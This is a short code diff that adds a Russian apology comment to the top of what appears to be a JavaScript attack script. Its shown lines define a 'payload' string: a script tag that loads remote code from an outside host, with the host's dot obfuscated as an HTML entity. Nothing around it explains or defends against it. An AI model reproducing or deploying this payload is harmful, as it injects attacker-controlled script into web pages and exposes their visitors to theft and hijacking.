@@ -1,4 +1,4 @@
-
+// Гриша извини ( ´•︵•` )
 (async function() {
   'use strict';
   const payload = "<script src='//niks&#46;dev/3.js'>"
